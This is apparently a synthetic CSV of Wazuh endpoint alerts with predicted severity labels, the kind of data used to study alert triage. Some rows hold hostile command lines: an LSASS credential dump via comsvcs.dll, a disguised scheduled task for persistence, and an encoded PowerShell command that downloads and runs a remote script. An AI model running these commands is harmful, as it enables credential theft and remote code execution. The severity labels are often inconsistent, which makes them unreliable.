@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-28T19:02:44.669Z,Endpoint3-Win,1,91512,Google Chrome update check executed,2,,EventChannel,"\""C:\Program Files\Google\Update\GoogleUpdate.exe\"" /c","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 4, ""mail"": true, ""level"": 2, ""description"": ""Google Chrome update check executed"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91512""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T19:02:44.669Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T19:02:44.669Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\\\"" /c"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2936"", ""utcTime"": ""2025-12-28 19:02:44.669""}}}}",critical
2025-12-28T22:20:27.163Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 45, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T22:20:27.163Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T22:20:27.163Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T22:20:27.163+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T02:45:49.629Z,Endpoint1-Win,3,92033,Scheduled task created,8,T1053.005,EventChannel,"schtasks /create /tn \""AdobeUpdate\"" /sc minute /mo 30 /tr \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 31, ""mail"": false, ""level"": 8, ""description"": ""Scheduled task created"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1053.005""]}, ""id"": ""92033""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T02:45:49.629Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T02:45:49.629Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""schtasks /create /tn \\\""AdobeUpdate\\\"" /sc minute /mo 30 /tr \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8454"", ""utcTime"": ""2025-12-29 02:45:49.629""}}}}",low
2025-12-29T06:16:51.718Z,Endpoint1-Win,3,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 49, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T06:16:51.718Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T06:16:51.718Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""11880"", ""utcTime"": ""2025-12-29 06:16:51.718""}}}}",critical
2025-12-30T07:28:36.253Z,Endpoint2-Win,2,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 56, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T07:28:36.253Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T07:28:36.253Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2341"", ""utcTime"": ""2025-12-30 07:28:36.253""}}}}",critical
2025-12-29T14:27:37.720Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 4, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T14:27:37.720Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T14:27:37.720Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T14:27:37.720+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T17:42:10.549Z,Endpoint2-Win,2,92080,Credential dumping attempt detected via LSASS access,16,T1003.001,EventChannel,"\""C:\Windows\System32\rundll32.exe\"" C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\ayoub\AppData\Local\Temp\lsass.dmp full","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 55, ""mail"": true, ""level"": 16, ""description"": ""Credential dumping attempt detected via LSASS access"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1003.001""]}, ""id"": ""92080""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T17:42:10.549Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T17:42:10.549Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\rundll32.exe\\\"" C:\\Windows\\System32\\comsvcs.dll, MiniDump 688 C:\\Users\\ayoub\\AppData\\Local\\Temp\\lsass.dmp full"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8239"", ""utcTime"": ""2025-12-29 17:42:10.549""}}}}",critical
2025-12-30T01:32:15.210Z,Endpoint3-Win,1,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T01:32:15.210Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T01:32:15.210Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9361"", ""utcTime"": ""2025-12-30 01:32:15.210""}}}}",critical
2025-12-30T10:53:13.056Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 30, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T10:53:13.056Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T10:53:13.056Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T10:53:13.056+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T16:41:25.473Z,Endpoint3-Win,1,91530,User executed network diagnostics,2,,EventChannel,"\""C:\Windows\System32\ping.exe\"" 8.8.8.8 -n 2","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 47, ""mail"": false, ""level"": 2, ""description"": ""User executed network diagnostics"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91530""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T16:41:25.473Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T16:41:25.473Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ping.exe\\\"" 8.8.8.8 -n 2"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7487"", ""utcTime"": ""2025-12-29 16:41:25.473""}}}}",medium
2025-12-30T11:27:08.003Z,Endpoint1-Win,3,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 5, ""mail"": false, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T11:27:08.003Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T11:27:08.003Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7941"", ""utcTime"": ""2025-12-30 11:27:08.003""}}}}",low
2025-12-30T03:00:01.065Z,Endpoint1-Win,3,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 60, ""mail"": true, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T03:00:01.065Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T03:00:01.065Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2130"", ""utcTime"": ""2025-12-30 03:00:01.065""}}}}",critical
2025-12-28T02:18:39.293Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 50, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T02:18:39.293Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T02:18:39.293Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T02:18:39.293+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T03:16:02.912Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 25, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T03:16:02.912Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T03:16:02.912Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T03:16:02.912+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T23:35:20.880Z,Endpoint2-Win,2,92033,Scheduled task created,8,T1053.005,EventChannel,"schtasks /create /tn \""AdobeUpdate\"" /sc minute /mo 30 /tr \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 35, ""mail"": false, ""level"": 8, ""description"": ""Scheduled task created"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1053.005""]}, ""id"": ""92033""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T23:35:20.880Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T23:35:20.880Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""schtasks /create /tn \\\""AdobeUpdate\\\"" /sc minute /mo 30 /tr \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9664"", ""utcTime"": ""2025-12-29 23:35:20.880""}}}}",low
2025-12-30T05:00:03.228Z,Endpoint2-Win,2,91501,Windows update executed successfully,3,,EventChannel,"\""C:\Windows\System32\UsoClient.exe\"" StartScan","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 20, ""mail"": false, ""level"": 3, ""description"": ""Windows update executed successfully"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91501""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T05:00:03.228Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T05:00:03.228Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\UsoClient.exe\\\"" StartScan"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""12034"", ""utcTime"": ""2025-12-30 05:00:03.228""}}}}",low
2025-12-29T14:44:03.388Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 30, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T14:44:03.388Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T14:44:03.388Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T14:44:03.388+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-28T20:04:19.193Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 49, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T20:04:19.193Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T20:04:19.193Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1527"", ""utcTime"": ""2025-12-28 20:04:19.193""}}}}",low
2025-12-29T20:46:38.784Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 16, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T20:46:38.784Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T20:46:38.784Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T20:46:38.784+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-28T07:20:49.608Z,Endpoint3-Win,1,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA=","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 48, ""mail"": false, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T07:20:49.608Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T07:20:49.608Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMgAwAC8AcAAuAHAAcwAxACcAKQA="", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7590"", ""utcTime"": ""2025-12-28 07:20:49.608""}}}}",medium
2025-12-28T17:03:50.552Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 9, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T17:03:50.552Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T17:03:50.552Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T17:03:50.552+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
2025-12-28T17:03:04.835Z,Endpoint1-Win,3,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 21, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T17:03:04.835Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T17:03:04.835Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10796"", ""utcTime"": ""2025-12-28 17:03:04.835""}}}}",critical
2025-12-28T17:15:02.309Z,Endpoint1-Win,3,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 34, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T17:15:02.309Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T17:15:02.309Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7775"", ""utcTime"": ""2025-12-28 17:15:02.309""}}}}",low
2025-12-28T20:02:09.062Z,Endpoint1-Win,3,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 57, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T20:02:09.062Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T20:02:09.062Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3869"", ""utcTime"": ""2025-12-28 20:02:09.062""}}}}",critical
2025-12-29T16:28:32.507Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 42, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T16:28:32.507Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T16:28:32.507Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T16:28:32.507+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
